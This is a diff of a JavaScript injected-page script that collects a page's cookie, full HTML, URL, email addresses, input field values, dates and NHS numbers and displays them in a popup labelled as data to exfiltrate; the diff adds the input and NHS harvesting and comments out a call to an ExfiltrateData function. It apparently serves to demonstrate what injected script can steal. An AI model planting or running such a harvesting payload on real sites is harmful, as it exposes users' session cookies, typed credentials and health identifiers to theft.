@@ -83,20 +83,55 @@ function BuildContainer(doc,titletext,datatext,dataheight,hyperlink)
 	doc.document.body.appendChild(container);
 	}//End If DataText
 }
-
 //Search for regex based data
 function SearchByRegex(BODYTEXT,REGEX){
+
 	var SB="";
-	var regExParsed = new RegExp(REGEX, 'gi');
-	var m;
-	do {
-		m = regExParsed.exec(BODYTEXT);
-    if (m) 
-	{
-        SB += m[1]+"\r\n";
+	const regex = REGEX;
+	let m;
+	
+	while ((m = regex.exec(BODYTEXT)) !== null) {
+    // This is necessary to avoid infinite loops with zero-width matches
+    if (m.index === regex.lastIndex) {
+        regex.lastIndex++;
     }
-	} while (m);	
+    
+    // The result can be accessed through the `m`-variable.
+		m.forEach((match, groupIndex) => {
+			
+			var cur = m[0];
+			if(!SB.includes(cur))
+			{
+				SB += m[0]+"\r\n";	
+			}
+				
+		});
+	}
+
 	return SB;
+}
+
+//Search Document for InputBoxes 
+function SearchForInputBoxes(){
+	
+	var inputs, index;
+	var Retrevied ="";
+	inputs = document.getElementsByTagName('input');
+	
+	for (index = 0; index < inputs.length; ++index) {
+		
+		if(typeof(inputs[index]) != "undefined")
+		{
+			if(inputs[index].value != "undefined")
+			{
+				var Name = "notset"
+				if(inputs[index].name) {Name = inputs[index].name};
+				Retrevied += inputs[index].value +"\t["+Name+"]\r\n";
+			}
+		}
+	}
+	
+	return Retrevied;
 }
 
 //Create the popup to show possible data to exfiltrate. 
@@ -115,7 +150,10 @@ BuildContainer(popup,"Exfiltration ID",TimeAsMS,20,1);
 BuildContainer(popup,"Document Location",DocLocation,20,0);
 BuildContainer(popup,"Document Cookie",UsersCookie,100,0);
 BuildContainer(popup,"Document Body InnerHTML",DocHTML,100,0);
-BuildContainer(popup,"Gleaned - Email Addresses",SearchByRegex(DocHTML,"([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)"),100,0);
+BuildContainer(popup,"Gleaned - Email Addresses",SearchByRegex(DocHTML,/([a-zA-Z0-9._-]+@[a-zA-Z0-9._-]+\.[a-zA-Z0-9_-]+)/gm),100,0);
+BuildContainer(popup,"Gleaned - Input Boxes",SearchForInputBoxes(),100,0);
+BuildContainer(popup,"Gleaned - Dates",SearchByRegex(DocHTML,/(0[1-9]|[12][0-9]|3[01])[- /.](0[1-9]|1[012])[- /.](19|20)\d\d/g),100,0);
+BuildContainer(popup,"Gleaned - NHS Numbers",SearchByRegex(DocHTML,/[0-9][0-9][0-9]\s*[0-9][0-9][0-9]\s*[0-9][0-9][0-9][0-9]/g),100,0);
 
 //Close after sometime as they are annnoying me
 setTimeout(function() { popup.close();}, 30000);
@@ -129,7 +167,7 @@ window.addEventListener('load', function () {
 	DocHTML = document.getElementsByTagName('body')[0].innerHTML;
 	DocLocation = document.location.href;	
 
-	ExfiltrateData(TimeAsMS);
+	//ExfiltrateData(TimeAsMS);
 	createPopup();
 
 })
